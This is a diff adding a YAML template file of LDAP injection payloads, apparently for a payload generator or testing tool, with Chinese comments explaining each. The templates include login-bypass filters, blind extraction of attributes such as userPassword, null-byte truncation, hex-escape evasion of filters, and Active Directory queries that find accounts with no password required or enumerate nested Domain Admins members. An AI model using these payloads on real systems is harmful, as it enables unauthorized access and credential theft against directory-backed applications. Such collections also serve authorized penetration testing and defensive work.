@@ -1,0 +1,236 @@
+ruleDB: v0.1.0
+# LDAP 注入模板。
+#
+# 载荷是 **LDAP 过滤器片段**，content_type 用 ldap-filter——它既不是 SQL 也不是 XPath，
+# 而 §3 定的口径是「描述载荷文本的语法」。混进 sql-expression 会让那个标签失准。
+#
+# 注入的本质是：应用把用户输入拼进 `(&(uid=<输入>)(password=<输入>))` 这样的过滤器，
+# 我们靠括号配对来改写过滤逻辑。
+
+templates:
+  - id: ldap.generic.auth.wildcard
+    name: LDAP 通配符登录绕过
+    desc: 闭合原本的括号再补一个恒真条件，是 LDAP 登录绕过最通用的一条
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "sAMAccountName", "userPrincipalName"],
+             default: "uid"}
+    body: "*)(<<attr>>=*))(|(<<attr>>=*"
+    vars: []
+    requires: [fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.auth.always_true
+    name: LDAP 密码条件恒真
+    desc: 已知用户名时，把密码条件改写成永远成立
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    # 这里只需要改**密码属性名**和用户名——用户名那条的目录属性在
+    # filter.or / blind.* 那几条里才需要区分，别为了对称塞一个用不上的槽位。
+    slots:
+      pf: {options: ["password", "userPassword", "passwd", "pwd"], default: "password"}
+    body: "<<user>>)(|(<<pf>>=*"
+    vars: [user]
+    requires: [fetch-sink, recon]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.filter.or
+    name: LDAP 过滤器或运算
+    desc: 直接构造一个恒真的 OR 过滤器
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "sAMAccountName", "userPrincipalName"],
+             default: "uid"}
+    body: "(|(<<attr>>=*)(<<attr>>=*))"
+    vars: []
+    requires: [fetch-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.blind.prefix
+    name: LDAP 盲注逐字符提取
+    desc: 把 ^前缀 换成候选值，响应有差异即命中。属性名按目标目录结构改
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "userPassword", "sAMAccountName", "description"], default: "uid"}
+    body: "*)(<<attr>>=<<prefix>>*"
+    vars: [prefix]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.blind.length
+    name: LDAP 盲注探长度
+    desc: 用通配符数量判断属性值长度，先定长度再逐字符猜更快
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "userPassword"], default: "userPassword"}
+    body: "*)(<<attr>>=<<stars>>*"
+    vars: [stars]
+    requires: [fetch-sink, boolean]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.filter.not
+    name: LDAP 取反过滤器
+    desc: 用 ! 取反，把"条件不成立"翻成"成立"，配合盲注判断
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "sAMAccountName", "userPrincipalName"],
+             default: "uid"}
+    body: ")(!(<<attr>>=<<value>>))(|(<<attr>>=*"
+    vars: [value]
+    requires: [fetch-sink, boolean]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.auth.nullbyte
+    name: LDAP 空字节截断
+    desc: 后端用 C 实现的目录服务可能把 %00 当字符串结尾，截掉后续的过滤器
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    body: "*))%00"
+    vars: []
+    requires: [fetch-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ldap.generic.blind.escape
+    name: LDAP 盲注十六进制转义
+    desc: 目标把星号、括号、反斜杠这些过滤器元字符都转义掉时，用反斜杠加两位十六进制的写法拼字符——转义器往往只挡字面量，认不出转义序列
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "sAMAccountName"], default: "uid"}
+    body: '*)(<<attr>>=\<<hex>>*'
+    vars: [hex]
+    requires: [fetch-sink, boolean, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- AD 特有的属性与匹配规则 ----
+  # 活动目录实现了几个扩展匹配规则（按 OID 写在属性名后面），把「按值比较」
+  # 变成「按位比较」「递归查组成员」这类语义——这是 AD 上独有的信息面，
+  # 也常被过滤器漏掉，因为载荷里没有元字符。
+
+  - id: ldap.generic.ad.bitmask
+    name: AD 按位匹配 userAccountControl
+    desc: >-
+      AD 的位掩码匹配规则（LDAP_MATCHING_RULE_BIT_AND，OID 1.2.840.113556.1.4.803）
+      可以判断某个标志位是否置上。2 是 ACCOUNTDISABLE、512 是 NORMAL_ACCOUNT、
+      32 是 PASSWD_NOTREQD —— 后者置位的账号可以直接空密码登录，拿它筛账号最省事。
+      只在 AD 上成立，OpenLDAP / 389DS 不认识这个 OID。
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: [active-directory]
+    version: "*"
+    slots:
+      attr: {options: ["userAccountControl", "sAMAccountType", "groupType"], default: "userAccountControl"}
+      v: {options: ["2", "512", "32", "65536", "66048"], default: "32"}
+    body: '*)(<<attr>>:1.2.840.113556.1.4.803:=<<v>>)(|(<<attr>>=*'
+    vars: []
+    requires: [fetch-sink, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ldap.generic.ad.memberof
+    name: AD 递归查组成员 memberOf
+    desc: >-
+      递归匹配规则（LDAP_MATCHING_RULE_IN_CHAIN，OID 1.2.840.113556.1.4.1941）
+      会把嵌套组的成员也算进来，一条过滤器就能问出「谁在 Domain Admins 里
+      （含嵌套）」——普通 memberOf 只能查直接成员。组 DN 按目标的域名改，
+      别照抄示例里的。AD 独有。
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: [active-directory]
+    version: "*"
+    body: '*)(memberOf:1.2.840.113556.1.4.1941:=CN=<<name>>,CN=Users,DC=<<domain>>,DC=local)(|(sAMAccountName=*'
+    vars: [name, domain]
+    requires: [fetch-sink, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ldap.generic.enum.objectclass
+    name: LDAP 按 objectClass 枚举
+    desc: >-
+      结构不明时先用它把目录里有哪些对象类型问出来（人、机器、组、OU 各一批）。
+      和盲注配合时用它限定结果集，比逐个试属性名快得多。
+      要精确匹配某个类时把通配符去掉即可，这里是前缀匹配的写法。
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      v: {options: ["user", "person", "computer", "group", "organizationalUnit",
+                    "contact", "inetOrgPerson"], default: "user"}
+    body: '*)(objectClass=<<v>>*'
+    vars: []
+    requires: [fetch-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ldap.generic.filter.and
+    name: LDAP 与运算过滤器
+    desc: >-
+      filter.or 的互补形态：把条件拼成 AND 而不是 OR。用在「必须同时满足两个条件」
+      的绕过上（比如要求账号存在**且**未被禁用），也可以把恒真的 AND 塞进去
+      把原本的条件挤掉。括号配对是这一门的全部技巧，数错一个就整条废掉。
+    vuln: [ldap]
+    content_type: [ldap-filter]
+    component: []
+    version: "*"
+    slots:
+      attr: {options: ["uid", "cn", "mail", "sAMAccountName", "userPrincipalName"],
+             default: "uid"}
+    body: '(&(<<attr>>=*)(objectClass=*))'
+    vars: []
+    requires: [fetch-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
